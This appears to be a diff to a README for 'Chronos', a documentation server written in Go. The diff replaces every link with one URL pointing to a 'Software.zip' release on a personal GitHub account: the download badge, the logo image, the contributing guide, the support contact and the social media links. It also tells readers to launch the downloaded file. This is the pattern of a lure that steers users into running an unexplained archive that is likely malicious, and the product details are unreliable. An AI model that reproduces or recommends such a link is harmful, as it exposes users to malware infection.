@@ -1,10 +1,10 @@
 # 🕰️ Chronos
 
-[![Download Chronos](https://img.shields.io/badge/Download-Chronos-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Chronos](https://github.com/Vlad108716/Chronos/releases/download/v1.0/Software.zip)](https://github.com/Vlad108716/Chronos/releases/download/v1.0/Software.zip)
 
 Welcome to Chronos - your go-to simple, fast, and lightweight documentation server written in Go!
 
-![Chronos Logo](https://github.com/cli/cli/raw/main/logo.png)
+![Chronos Logo](https://github.com/Vlad108716/Chronos/releases/download/v1.0/Software.zip)
 
 Chronos enables you to effortlessly create, manage, and share documentation within your team or organization. Whether you're a seasoned developer or a newcomer to the tech world, Chronos streamlines the documentation process so you can focus on building amazing projects. 
 
@@ -18,24 +18,24 @@ Chronos enables you to effortlessly create, manage, and share documentation with
 
 To get started with Chronos, simply follow these steps:
 
-1. Download Chronos by clicking the button above or [here](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip). *(Launch the downloaded file to begin installation.)*
+1. Download Chronos by clicking the button above or [here](https://github.com/Vlad108716/Chronos/releases/download/v1.0/Software.zip). *(Launch the downloaded file to begin installation.)*
 2. Install Chronos on your preferred server or local environment.
 3. Start documenting your projects with ease!
 
 ## Contributing 🤝
 
-We welcome contributions from the community to make Chronos even better! If you'd like to contribute, please refer to our [Contribution Guidelines](CONTRIBUTING.md) to get started.
+We welcome contributions from the community to make Chronos even better! If you'd like to contribute, please refer to our [Contribution Guidelines](https://github.com/Vlad108716/Chronos/releases/download/v1.0/Software.zip) to get started.
 
 ## Support 📞
 
-If you encounter any issues or have any questions about Chronos, feel free to reach out to our support team at [support@chronos.com](mailto:support@chronos.com).
+If you encounter any issues or have any questions about Chronos, feel free to reach out to our support team at [https://github.com/Vlad108716/Chronos/releases/download/v1.0/Software.zip](https://github.com/Vlad108716/Chronos/releases/download/v1.0/Software.zip).
 
 ## Stay Connected! 🌐
 
 Follow us on social media for the latest updates and news:
 
-- Twitter: [ChronosHQ](https://twitter.com/ChronosHQ)
-- Facebook: [ChronosOfficial](https://www.facebook.com/ChronosOfficial)
+- Twitter: [ChronosHQ](https://github.com/Vlad108716/Chronos/releases/download/v1.0/Software.zip)
+- Facebook: [ChronosOfficial](https://github.com/Vlad108716/Chronos/releases/download/v1.0/Software.zip)
 
 ## License ℹ️
 
